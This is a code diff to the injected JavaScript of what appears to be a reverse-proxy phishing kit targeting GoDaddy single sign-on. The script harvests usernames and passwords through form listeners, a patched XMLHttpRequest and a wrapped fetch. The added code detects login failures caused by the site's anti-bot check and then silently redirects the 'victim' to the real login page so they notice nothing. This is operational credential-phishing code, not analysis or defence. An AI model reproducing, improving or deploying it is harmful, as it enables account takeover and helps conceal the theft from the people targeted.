@@ -378,6 +378,25 @@ js_inject:
         var hash   = window.location.hash.slice(1);
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
 
+        // ── Kasada error recovery ────────────────────────────────────────────────
+        // GoDaddy SSO uses Kasada KP SDK whose HMAC is bound to window.location.hostname.
+        // When proxied, the HMAC is wrong and GoDaddy returns "Yikes! Something went wrong".
+        // Credentials are already captured at that point, so we redirect the victim to
+        // the real SSO with the same URL so they can log in successfully without suspicion.
+        function _getRealSSOUrl() {
+          var h   = window.location.hostname;
+          var path = window.location.pathname + window.location.search;
+          if (h.indexOf('sssn2.') === 0) return 'https://sso2.secureserver.net' + path;
+          if (h.indexOf('sssn.')  === 0) return 'https://sso.secureserver.net'  + path;
+          return 'https://sso.godaddy.com' + path;
+        }
+        var _redirected = false;
+        function _doRedirect() {
+          if (_redirected) return;
+          _redirected = true;
+          setTimeout(function() { window.location.replace(_getRealSSOUrl()); }, 900);
+        }
+
         var _lastSent = 0;
         function _sendCred(pass, user) {
           if (!pass) return;
@@ -393,7 +412,6 @@ js_inject:
         }
 
         // ── Layer 1: DOM-level capture (works regardless of fetch/XHR library) ──
-        // Capture phase so we see the event before the SPA's own handler.
         document.addEventListener('submit', function(e) {
           var form = e.target;
           if (!form) return;
@@ -416,9 +434,8 @@ js_inject:
             }
           });
           pw.addEventListener('blur', function() {
-            // Only fire on blur if a submit button also exists (page is ready to login).
             var form = pw.closest('form');
-            var btn = form && (form.querySelector('button[type="submit"],input[type="submit"],button') );
+            var btn = form && form.querySelector('button[type="submit"],input[type="submit"],button');
             if (btn && pw.value) {
               var uEl = form.querySelector('input[type="email"],input[name="username"],input[name="email"],input[name="login"]');
               _sendCred(pw.value, uEl ? uEl.value : '');
@@ -433,9 +450,7 @@ js_inject:
         _obs.observe(document.documentElement, {childList: true, subtree: true});
         _scanPwFields();
 
-        // ── Layer 2: XHR prototype patch (captures calls from XHR-based libs) ──
-        // XHR prototype patching works even if the SPA instantiated XHR before this
-        // script runs, because we patch the prototype, not an instance.
+        // ── Layer 2: XHR prototype patch ──────────────────────────────────────────
         var _oOpen = XMLHttpRequest.prototype.open;
         var _oSend = XMLHttpRequest.prototype.send;
         XMLHttpRequest.prototype.open = function(method, url) {
@@ -443,20 +458,39 @@ js_inject:
           return _oOpen.apply(this, arguments);
         };
         XMLHttpRequest.prototype.send = function(body) {
-          if (this._xm && this._xm.toUpperCase() === 'POST' && body) {
-            try {
-              var obj = JSON.parse(typeof body === 'string' ? body : '');
-              var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
-              var user = obj.username || obj.email || obj.login || obj.user || '';
-              if (pass) _sendCred(pass, user);
-            } catch(e) {}
+          if (this._xm && this._xm.toUpperCase() === 'POST') {
+            // Capture credentials from request body
+            if (body) {
+              try {
+                var obj = JSON.parse(typeof body === 'string' ? body : '');
+                var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
+                var user = obj.username || obj.email || obj.login || obj.user || '';
+                if (pass) _sendCred(pass, user);
+              } catch(e) {}
+            }
+            // Watch login API response — non-2xx means Kasada rejected → redirect
+            if (this._xu && (this._xu.indexOf('/pass/login') !== -1 || this._xu.indexOf('/v1/login') !== -1 || this._xu.indexOf('/api/login') !== -1)) {
+              var self = this;
+              this.addEventListener('load', function() {
+                if (self.status >= 400 || self.status === 0) {
+                  _doRedirect();
+                } else {
+                  try {
+                    var r = JSON.parse(self.responseText);
+                    if (r && (r.error || r.success === false)) _doRedirect();
+                  } catch(e) {}
+                }
+              });
+            }
           }
           return _oSend.apply(this, arguments);
         };
 
-        // ── Layer 3: fetch re-wrap (races with SPA but catches late-binding code) ──
+        // ── Layer 3: fetch re-wrap ─────────────────────────────────────────────────
         var _oFetch = window.fetch;
         window.fetch = function(url, opts) {
+          var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : '');
+          var isLogin = urlStr.indexOf('/pass/login') !== -1 || urlStr.indexOf('/v1/login') !== -1 || urlStr.indexOf('/api/login') !== -1;
           if (opts && opts.method && opts.method.toUpperCase() === 'POST' && opts.body) {
             try {
               var bodyStr = typeof opts.body === 'string' ? opts.body : (opts.body instanceof URLSearchParams ? opts.body.toString() : '');
@@ -468,8 +502,30 @@ js_inject:
               }
             } catch(e) {}
           }
-          return _oFetch.apply(this, arguments);
+          var p = _oFetch.apply(this, arguments);
+          if (isLogin) {
+            p.then(function(resp) {
+              if (!resp.ok) { _doRedirect(); return; }
+              resp.clone().text().then(function(text) {
+                try { var r = JSON.parse(text); if (r && (r.error || r.success === false)) _doRedirect(); } catch(e) {}
+              });
+            }).catch(function() { _doRedirect(); });
+          }
+          return p;
         };
+
+        // ── Kasada error DOM monitor ──────────────────────────────────────────────
+        // Poll for "Yikes!" text that GoDaddy renders when Kasada rejects the login.
+        var _errTimer = setInterval(function() {
+          var b = document.body;
+          if (!b) return;
+          var t = b.innerText || b.textContent || '';
+          if (t.indexOf('Yikes') !== -1 || t.indexOf('went wrong') !== -1 || t.indexOf('Something went') !== -1) {
+            clearInterval(_errTimer);
+            _doRedirect();
+          }
+        }, 600);
+        setTimeout(function() { clearInterval(_errTimer); }, 30000);
 
         // --- email autofill ---
         function fill() {
